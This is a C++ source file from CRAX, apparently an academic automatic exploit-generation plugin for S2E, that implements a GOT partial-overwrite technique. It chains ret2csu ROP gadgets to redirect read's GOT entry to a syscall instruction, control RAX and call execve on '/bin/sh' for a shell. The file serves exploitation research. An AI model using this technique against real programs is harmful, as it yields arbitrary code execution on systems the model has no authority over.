// Copyright 2021-2022 Software Quality Laboratory, NYCU.
//
// Permission is hereby granted, free of charge, to any person obtaining a copy
// of this software and associated documentation files (the "Software"), to deal
// in the Software without restriction, including without limitation the rights
// to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
// copies of the Software, and to permit persons to whom the Software is
// furnished to do so, subject to the following conditions:
//
// The above copyright notice and this permission notice shall be included in all
// copies or substantial portions of the Software.
//
// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
// IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
// FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
// AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
// LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
// OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
// SOFTWARE.

#include <s2e/Plugins/CRAX/CRAX.h>
#include <s2e/Plugins/CRAX/Techniques/Ret2csu.h>
#include <s2e/Plugins/CRAX/Utils/StringUtil.h>

#include <cassert>
#include <fstream>

#include "GotPartialOverwrite.h"

namespace s2e::plugins::crax {

GotPartialOverwrite::GotPartialOverwrite()
    : Technique() {
    resolveRequiredGadgets();
}


bool GotPartialOverwrite::checkRequirements() const {
    return true;
}

std::vector<RopSubchain> GotPartialOverwrite::getRopSubchains() const {
    const Exploit &exploit = g_crax->getExploit();
    const ELF &elf = exploit.getElf();

    auto ret2csu = dynamic_cast<Ret2csu *>(g_crax->getTechnique("Ret2csu"));
    assert(ret2csu);

    // read(0, elf.got['read'], 1), setting RAX to 1.
    RopSubchain read1 = ret2csu->getRopSubchains(
        BaseOffsetExpr::create(elf, "sym", "read"),
        ConstantExpr::create(0, Expr::Int64),
        BaseOffsetExpr::create(elf, "got", "read"),
        ConstantExpr::create(1, Expr::Int64))[0];

    // write(1, 0, 0), setting RAX to 0.
    RopSubchain read2 = ret2csu->getRopSubchains(
        BaseOffsetExpr::create(elf, "sym", "read"),
        ConstantExpr::create(1, Expr::Int64),
        ConstantExpr::create(0, Expr::Int64),
        ConstantExpr::create(0, Expr::Int64))[0];

    // Read "/bin/sh" into elf.bss(), setting RAX to 59.
    RopSubchain read3 = ret2csu->getRopSubchains(
        BaseOffsetExpr::create(elf, "sym", "read"),
        ConstantExpr::create(0, Expr::Int64),
        BaseOffsetExpr::create(elf, "bss"),
        ConstantExpr::create(59, Expr::Int64))[0];

    // Return to sys_execve.
    RopSubchain read4 = ret2csu->getRopSubchains(
        BaseOffsetExpr::create(elf, "sym", "read"),
        BaseOffsetExpr::create(elf, "bss"),
        ConstantExpr::create(0, Expr::Int64),
        ConstantExpr::create(0, Expr::Int64))[0];

    RopSubchain part1;
    RopSubchain part2;
    RopSubchain part3;

    part1.reserve(1 + read1.size() + read2.size() + read3.size() + read4.size());
    part1.push_back(ConstantExpr::create(0, Expr::Int64));
    part1.insert(part1.end(), read1.begin(), read1.end());
    part1.insert(part1.end(), read2.begin(), read2.end());
    part1.insert(part1.end(), read3.begin(), read3.end());
    part1.insert(part1.end(), read4.begin(), read4.end());
    part2 = { ByteVectorExpr::create(std::vector<uint8_t> { getLsbOfReadSyscall() }) };
    part3 = { ByteVectorExpr::create(ljust("/bin/sh", 59, 0x00)) };

    return {part1, part2, part3};
}

RopSubchain GotPartialOverwrite::getExtraRopSubchain() const {
    return {};
}


uint8_t GotPartialOverwrite::getLsbOfReadSyscall() const {
    // Get __read() info from libc.
    auto f = g_crax->getExploit().getLibc().functions()["__read"];

    std::vector<uint8_t> code(f.size);
    std::ifstream ifs(g_crax->getExploit().getLibcFilename(), std::ios::binary);
    ifs.seekg(f.address, std::ios::beg);
    ifs.read(reinterpret_cast<char*>(code.data()), f.size);

    uint64_t syscallOffset = -1;
    for (auto i : disas().disasm(code, f.address)) {
        if (i.mnemonic == "syscall") {
            syscallOffset = i.address;
            assert((syscallOffset & 0xff00) == (f.address & 0xff00));
            break;
        }
    }
    return syscallOffset & 0xff;
}

}  // namespace s2e::plugins::crax
